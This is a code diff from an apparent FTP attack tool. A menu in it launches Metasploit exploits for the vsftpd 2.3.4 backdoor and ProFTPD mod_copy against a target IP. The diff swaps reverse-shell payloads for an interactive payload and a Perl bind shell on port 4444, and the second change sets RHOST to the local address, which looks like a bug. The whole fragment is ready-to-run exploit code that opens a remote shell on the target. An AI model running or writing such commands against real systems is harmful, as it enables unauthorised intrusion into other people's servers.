@@ -89,10 +89,10 @@ def perform_ftp_attack():
     choice = input("Enter the number of the attack to perform: ")
 
     if choice == "1":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/reverse; set LHOST {local_ip}; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
         return exploit_ftp(metasploit_command)
     elif choice == "2":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/reverse; set LHOST {local_ip}; run'"
+        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/bind_perl; set LPORT 4444; set RHOST {local_ip}; run'"
         return exploit_ftp(metasploit_command)
     else:
         print("Invalid choice\n")
